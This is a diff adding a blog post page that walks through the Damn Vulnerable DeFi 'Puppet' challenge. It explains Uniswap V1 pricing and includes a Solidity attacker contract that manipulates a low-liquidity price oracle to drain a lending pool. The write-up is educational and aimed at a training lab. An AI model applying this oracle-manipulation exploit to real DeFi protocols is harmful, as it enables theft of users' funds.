@@ -1,0 +1,342 @@
+<!DOCTYPE html>
+<html lang="en"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <style>
+        :root {
+            --accent-color: #FF4D4D;
+            --font-size: 1.1rem;
+        }
+    </style>
+
+    
+    
+    
+    
+    
+    
+
+    
+    <title>Puppet Writeup</title>
+    <meta name="description" content="Welcome back! This will be a series of three posts on the Uniswap challenges from Damn Vulnerable DeFi. I&rsquo;ve just finished Puppet V3 and learned a lot …">
+    <meta name="keywords" content=''>
+
+    <meta property="og:url" content="http://localhost:1313/posts/puppet-witeup/">
+    <meta property="og:type" content="website">
+    <meta property="og:title" content="Puppet Writeup">
+    <meta property="og:description" content="Welcome back! This will be a series of three posts on the Uniswap challenges from Damn Vulnerable DeFi. I&rsquo;ve just finished Puppet V3 and learned a lot …">
+    <meta property="og:image" content="http://localhost:1313/">
+    <meta property="og:image:secure_url" content="http://localhost:1313/">
+
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="Puppet Writeup">
+    <meta name="twitter:description" content="Welcome back! This will be a series of three posts on the Uniswap challenges from Damn Vulnerable DeFi. I&rsquo;ve just finished Puppet V3 and learned a lot …">
+    <meta property="twitter:domain" content="http://localhost:1313/posts/puppet-witeup/">
+    <meta property="twitter:url" content="http://localhost:1313/posts/puppet-witeup/">
+    <meta name="twitter:image" content="http://localhost:1313/">
+
+    
+    <link rel="canonical" href="http://localhost:1313/posts/puppet-witeup/">
+
+    
+    <link rel="stylesheet" type="text/css" href="/css/normalize.min.css" media="print">
+
+    
+    <link rel="stylesheet" type="text/css" href="/css/main.min.css">
+
+    
+    <link id="dark-theme" rel="stylesheet" href="/css/dark.min.css">
+
+    
+    <script src="/js/bundle.min.70293498aa96b2dbb767ec11a622eb2266d8fc37a0fff88233a82952e3c72b15.js" integrity="sha256-cCk0mKqWstu3Z&#43;wRpiLrImbY/Deg//iCM6gpUuPHKxU="></script>
+
+    
+    
+        <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']],
+        displayMath: [['$$', '$$'], ['\\[', '\\]']]
+      }
+    };
+    </script>
+    <script id="MathJax-script" async
+      src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js">
+    </script>
+  
+    
+</head>
+<body>
+        <script>
+            
+            setThemeByUserPref();
+        </script><header class="header">
+    <nav class="header-nav">
+
+        
+
+        <div class="nav-title">
+            <a class="nav-brand" href="http://localhost:1313/">Complexity</a>
+        </div>
+
+        <div class="nav-links">
+            
+            <div class="nav-link">
+                <a href="http://localhost:1313/posts/" aria-label="" > Posts </a>
+            </div>
+            
+            <div class="nav-link">
+                <a href="https://x.com/devrar98" aria-label="twitter" target="_blank"><span data-feather='twitter'></span>  </a>
+            </div>
+            
+            <div class="nav-link">
+                <a href="https://github.com/Devrar" aria-label="github" target="_blank"><span data-feather='github'></span>  </a>
+            </div>
+            
+            <div class="nav-link">
+                <a href="https://lichess.org/@/Devrar" aria-label="lichess" target="_blank"><img class='svg-inject' src='/svg/icons/lichess.svg' />  </a>
+            </div>
+            
+
+            <span class="nav-icons-divider"></span>
+            <div class="nav-link dark-theme-toggle">
+                <span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
+                <a aria-hidden="true" role="switch">
+                    <span class="theme-toggle-icon" data-feather="moon"></span>
+                </a>
+            </div>
+
+            <div class="nav-link" id="hamburger-menu-toggle">
+                <span class="sr-only hamburger-menu-toggle-screen-reader-target">menu</span>
+                <a aria-checked="false" aria-labelledby="hamburger-menu-toggle" id="hamburger-menu-toggle-target" role="switch">
+                    <span data-feather="menu"></span>
+                </a>
+            </div>
+
+            
+            <ul class="nav-hamburger-list visibility-hidden">
+                
+                <li class="nav-item">
+                    <a href="http://localhost:1313/posts/" > Posts </a>
+                </li>
+                
+                <li class="nav-item">
+                    <a href="https://x.com/devrar98" target="_blank"><span data-feather='twitter'></span>  </a>
+                </li>
+                
+                <li class="nav-item">
+                    <a href="https://github.com/Devrar" target="_blank"><span data-feather='github'></span>  </a>
+                </li>
+                
+                <li class="nav-item">
+                    <a href="https://lichess.org/@/Devrar" target="_blank"><img class='svg-inject' src='/svg/icons/lichess.svg' />  </a>
+                </li>
+                
+                <li class="nav-item dark-theme-toggle">
+                    <span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
+                    <a role="switch">
+                        <span class="theme-toggle-icon" data-feather="moon"></span>
+                    </a>
+                </li>
+            </ul>
+
+        </div>
+    </nav>
+</header>
+<main id="content">
+    <div class="post container">
+    <div class="post-header-section">
+        <h1>Puppet Writeup</h1>
+
+        
+
+        
+	
+	
+	
+	
+        
+
+	
+
+	
+
+	
+          <small role="doc-subtitle"></small>
+	
+
+	
+          <p class="post-date">
+              
+
+              October 4, 2025
+
+              
+          </p>
+	
+
+        <ul class="post-tags">
+          
+        </ul>
+    </div>
+
+    <div class="post-content">
+        <p>Welcome back! This will be a series of three posts on the Uniswap challenges from <a href="https://www.damnvulnerabledefi.xyz/">Damn Vulnerable DeFi</a>. I&rsquo;ve just finished <a href="https://www.damnvulnerabledefi.xyz/challenges/puppet-v3/">Puppet V3</a> and learned a lot about the protocol, so I thought it would be nice to write down what I understood and see if I can explain it clearly.</p>
+<blockquote>
+<p>&ldquo;You do not really understand something unless you can explain it to your grandmother.&rdquo;</p>
+<p><em>— Albert Einstein</em></p></blockquote>
+<details class="spoiler">
+  <summary>Spoiler</summary>
+  No, Einstein didn&rsquo;t actually say that.
+</details>
+<h2 id="uniswap-very-approximate-overview">Uniswap (very approximate) overview</h2>
+<p><em>Disclaimer: this is not a real explanation of the protocol. If you want to understand it properly, I suggest reading the <a href="https://rareskills.io/uniswap-v3-book">Rare Skills Blog</a>.</em></p>
+<h3 id="what-is-uniswap">What is Uniswap?</h3>
+<blockquote>
+<p>In 2018, Hayden Adams created the Uniswap Protocol, a decentralized protocol that introduced a new way to exchange value online. By using Automated Market Makers (AMMs), the protocol enabled peer-to-peer trading of digital assets without the need for intermediaries or any central authority.</p></blockquote>
+<p>This (or something similar) is what I found when I searched for an explanation of the protocol. But, knowing almost nothing about decentralized finance, I had no idea what it meant.</p>
+<p>The idea is actually simple: Uniswap (in its first version, which will be the focus of this post) lets you create exchanges between any ERC20 token and ETH. And what about Automated Market Makers? That just means all the exchanges are managed by smart contracts and fully automated (you don&rsquo;t say?), whereas other solutions rely on order books, which I don&rsquo;t know how they work, but I imagine something like:</p>
+<ul>
+<li>Alice: &ldquo;Hey! I&rsquo;m selling 1 token for 3 ETH, anyone interested??&rdquo;</li>
+<li>Bob: &ldquo;That&rsquo;s a scam! I&rsquo;m willing to pay at most 2 ETH!&rdquo;</li>
+<li>Charlie: &ldquo;Hey Bob, I&rsquo;ll sell for 2 ETH!&rdquo;</li>
+<li><em>Bob and Charlie exchange and are happy; Alice is sad.</em></li>
+</ul>
+<p><strong>Achtung!</strong> This <em>might</em> be an oversimplification of the actual protocol.</p>
+<h3 id="how-does-it-work">How does it work?</h3>
+<p>It&rsquo;s pretty clear why an order-book solution can work, but <strong>how does an automated solution work?</strong> <strong>How does it determine the “right” price? How does the price change?</strong> <strong>Where does the liquidity come from?</strong> The answer to all these questions lies in the magic Uniswap curve $x \cdot y = k$. Except for the liquidity, that&rsquo;s just people providing tokens and ETH to the pool to earn fees — not so magical. But let&rsquo;s focus on the curve.</p>
+<p>Consider an exchange between DVT (Damn Valuable Token, from the Damn Vulnerable DeFi challenges) and ETH. The exchange pool has reserves of both DVT and ETH: when a user wants to swap DVT for ETH they send DVT to the pool and the pool sends back ETH. <strong>But how much ETH?</strong> That&rsquo;s where the curve comes into play.</p>
+<p>Call $x$ the amount of DVT in the pool and $y$ the amount of ETH. The exchange follows the invariant $k = x\cdot y$. This means that if we want to swap $\Delta x$ DVT, we will receive $\Delta y$ ETH such that $(x + \Delta x)(y - \Delta y) = k$ (ignoring fees). Visualized on the curve it looks something like this:</p>
+<p><img src="./img1.png" alt=""></p>
+<details class="spoiler">
+  <summary>Spoiler</summary>
+  I know this is terrible, but I have no idea how to make decent graphs and insert them in markdown — any suggestions are very welcome.
+</details>
+<p>Now you might ask, <strong>Why this curve? Why not a random different one?</strong> I don&rsquo;t know - that&rsquo;s why I called it magical - but probably they found it works well. It also makes sense on how the price is computed I guess.</p>
+<p>Speaking of price: when we talk about price, we mean the price of the asset on the $x$-axis relative to the one on the $y$-axis, and it is computed as $p = \frac{y}{x}$. So in the example above, the price is initially $p_1 = \frac{y}{x} = 4$, meaning 1 DVT is worth 4 ETH. After the swap it becomes $p_2 = \frac{y - \Delta y}{x + \Delta x} = 1$. That&rsquo;s a huge price shift! <strong>How can we avoid that?</strong></p>
+<h3 id="the-role-of-liquidity">The role of liquidity</h3>
+<p>Let&rsquo;s analyze the curve above. We are on $x \cdot y = 10^4$ and initially the reserves are 50 DVT and 200 ETH. Then we swap 50 DVT — an amount equal to the entire DVT reserve of the pool! — so it&rsquo;s not surprising this has a big impact on price. The problem here is that the pool has very low liquidity.</p>
+<p>Suppose instead the curve was $x \cdot y = 10^{20}$ and the price was the same, i.e. reserves $x = 5\cdot 10^9$ and $y = 20\cdot 10^9$. If we make the same swap for 50 DVT, what happens?</p>
+<p>$$
+\begin{align*}
+\Delta x &amp;= 50 \\[1em]
+x + \Delta x &amp;= 5\cdot 10^9 + 50 \\[1em]
+y - \Delta y = \frac{10^{20}}{5\cdot 10^9 + 50} &amp;\simeq 19999999800 \\[1em]
+\Delta y \simeq y - 19999999800 &amp;= 200 \\[1em]
+p_2 = \frac{y - \Delta y}{x + \Delta x} &amp;\simeq 3.99999992
+\end{align*}
+$$</p>
+<p>The price shifted from 4 to 3.99999992 with the same swap amount — much lower impact. So, the takeaway:</p>
+<ul>
+<li><strong>Low liquidity</strong> → high price impact and the possibility to manipulate the price in your favor.</li>
+<li><strong>High liquidity</strong> → well, it&rsquo;s just the opposite of the one above.</li>
+</ul>
+<h2 id="challenge-writeup">Challenge Writeup</h2>
+<p>Now we should know enough to tackle the challenge! I will omit all the $10^{18}$ multipliers and work with normal decimal numbers. The important thing is to remember that the code uses multiplications and divisions by $10^{18}$ because ERC20 tokens handle decimals that way (I know it&rsquo;s not a satisfying explanation, but it&rsquo;s not that important).</p>
+<h3 id="challenge-overview">Challenge overview</h3>
+<p>The setting is simple:</p>
+<ul>
+<li>Uniswap v1 exchange pool between DVT and ETH, with initial reserves of 10 DVT and 10 ETH.</li>
+<li>DVT lending pool, with an initial balance of 100,000 DVT, that requires 2× the price of the borrowed amount in ETH (quite expensive).</li>
+<li>Player, with 1,000 DVT and 25 ETH.</li>
+<li>Goal: empty the lending pool and get all the tokens.</li>
+</ul>
+<p>The lending pool uses the exchange as a price oracle:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">calculateDepositRequired</span>(<span style="color:#66d9ef">uint256</span> amount) <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">view</span> <span style="color:#66d9ef">returns</span> (<span style="color:#66d9ef">uint256</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> amount <span style="color:#f92672">*</span> _computeOraclePrice() <span style="color:#f92672">*</span> DEPOSIT_FACTOR <span style="color:#f92672">/</span> <span style="color:#ae81ff">10</span> <span style="color:#f92672">**</span> <span style="color:#ae81ff">18</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">_computeOraclePrice</span>() <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">view</span> <span style="color:#66d9ef">returns</span> (<span style="color:#66d9ef">uint256</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// calculates the price of the token in wei according to Uniswap pair
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">return</span> uniswapPair.balance <span style="color:#f92672">*</span> (<span style="color:#ae81ff">10</span> <span style="color:#f92672">**</span> <span style="color:#ae81ff">18</span>) <span style="color:#f92672">/</span> token.balanceOf(uniswapPair);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Right now, if we wanted to borrow all 100,000 tokens from the pool, since the exchange price is 1, we&rsquo;d need $100{,}000 \cdot 2 = 200{,}000$ ETH — which is just a bit more than we have.</p>
+<h3 id="manipulating-the-price">Manipulating the price</h3>
+<p>We can immediately notice that the exchange pool has very low liquidity and we hold 100 times the DVT reserve! This means we can easily lower the DVT price by swapping all our tokens. Let&rsquo;s see what happens if we swap all 1,000 DVT:</p>
+<p>$$
+\begin{align*}
+k &amp;= 100 \\[1em]
+\Delta x &amp;= 1000 \\[1em]
+x + \Delta x &amp;= 1010 \\[1em]
+y - \Delta y = \frac{100}{1010} &amp;\simeq 0.099 \\[1em]
+p_2 = \frac{y - \Delta y}{x + \Delta x} &amp;\simeq 0.000098
+\end{align*}
+$$</p>
+<p>Now the ETH required to borrow the entire 100,000 DVT from the lending pool is $100{,}000 \cdot 0.000098 \cdot 2 = 19.6$, which is within our resources. In the actual attack the amount needed will be slightly higher (around 19.66) due to fees and rounding.</p>
+<h3 id="the-final-contract">The final contract</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#66d9ef">contract</span> <span style="color:#a6e22e">Attacker</span> {
+</span></span><span style="display:flex;"><span>    IUniswapV1Exchange <span style="color:#66d9ef">public</span> uniswapV1Exchange;
+</span></span><span style="display:flex;"><span>    PuppetPool <span style="color:#66d9ef">public</span> lendingPool;
+</span></span><span style="display:flex;"><span>    DamnValuableToken <span style="color:#66d9ef">public</span> token;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">address</span> recovery;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint256</span> <span style="color:#66d9ef">constant</span> UNISWAP_INITIAL_TOKEN_RESERVE <span style="color:#f92672">=</span> <span style="color:#ae81ff">10</span>e18;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint256</span> <span style="color:#66d9ef">constant</span> UNISWAP_INITIAL_ETH_RESERVE <span style="color:#f92672">=</span> <span style="color:#ae81ff">10</span>e18;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint256</span> <span style="color:#66d9ef">constant</span> PLAYER_INITIAL_TOKEN_BALANCE <span style="color:#f92672">=</span> <span style="color:#ae81ff">1000</span>e18;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint256</span> <span style="color:#66d9ef">constant</span> PLAYER_INITIAL_ETH_BALANCE <span style="color:#f92672">=</span> <span style="color:#ae81ff">25</span>e18;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint256</span> <span style="color:#66d9ef">constant</span> POOL_INITIAL_TOKEN_BALANCE <span style="color:#f92672">=</span> <span style="color:#ae81ff">100</span>_000e18;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">constructor</span>(<span style="color:#66d9ef">address</span> _uniswapV1Exchange, <span style="color:#66d9ef">address</span> _lendingPool, <span style="color:#66d9ef">address</span> _token, <span style="color:#66d9ef">address</span> _recovery) {
+</span></span><span style="display:flex;"><span>        uniswapV1Exchange <span style="color:#f92672">=</span> IUniswapV1Exchange(_uniswapV1Exchange);
+</span></span><span style="display:flex;"><span>        lendingPool <span style="color:#f92672">=</span> PuppetPool(_lendingPool);
+</span></span><span style="display:flex;"><span>        token <span style="color:#f92672">=</span> DamnValuableToken(_token);
+</span></span><span style="display:flex;"><span>        recovery <span style="color:#f92672">=</span> _recovery;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">attack</span>() <span style="color:#66d9ef">external</span> {
+</span></span><span style="display:flex;"><span>        token.approve(<span style="color:#66d9ef">address</span>(uniswapV1Exchange), PLAYER_INITIAL_TOKEN_BALANCE);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">uint256</span> tokensBought <span style="color:#f92672">=</span> uniswapV1Exchange.tokenToEthSwapInput(
+</span></span><span style="display:flex;"><span>            PLAYER_INITIAL_TOKEN_BALANCE,
+</span></span><span style="display:flex;"><span>            <span style="color:#ae81ff">1</span>, <span style="color:#75715e">// min_eth
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            block.timestamp <span style="color:#f92672">*</span> <span style="color:#ae81ff">2</span> <span style="color:#75715e">// deadline
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        );
+</span></span><span style="display:flex;"><span>        console.log(<span style="color:#e6db74">&#34;ETH received from Uniswap:&#34;</span>, <span style="color:#66d9ef">address</span>(this).balance);
+</span></span><span style="display:flex;"><span>        console.log(<span style="color:#e6db74">&#34;Tokens bought from Uniswap:&#34;</span>, tokensBought);
+</span></span><span style="display:flex;"><span>        console.log(<span style="color:#e6db74">&#34;Lending pool deposit required:&#34;</span>, lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        lendingPool.borrow{value<span style="color:#f92672">:</span> <span style="color:#66d9ef">address</span>(this).balance}(POOL_INITIAL_TOKEN_BALANCE, <span style="color:#66d9ef">address</span>(this));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        console.log(<span style="color:#e6db74">&#34;Player token balance after borrowing:&#34;</span>, token.balanceOf(<span style="color:#66d9ef">address</span>(this)));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        token.transfer(recovery, POOL_INITIAL_TOKEN_BALANCE);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    receive() <span style="color:#66d9ef">external</span> <span style="color:#66d9ef">payable</span> {}
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h2 id="conclusion">Conclusion</h2>
+<p>This first challenge was quite simple and can be completed in a very intuitive way — without fully understanding Uniswap internals (which is exactly how I solved it at first). However, introducing the Uniswap curve and getting comfortable with price computation will be very useful for the next challenges. But before that, I might write a post about a chess tournament I recently played — we’ll see.</p>
+<p>To be continued.</p>
+
+        
+    </div>
+
+    <div class="prev-next">
+        
+    </div>
+
+    
+    
+    
+</div>
+
+
+
+    
+
+        </main><footer class="footer">
+    
+    
+
+    
+
+    
+
+    
+
+    <span>
+        Made with &#10084;&#65039; using <a target="_blank" href="https://github.com/gokarna-theme/gokarna-hugo">Gokarna</a>
+    </span>
+</footer>
+</body>
+</html>
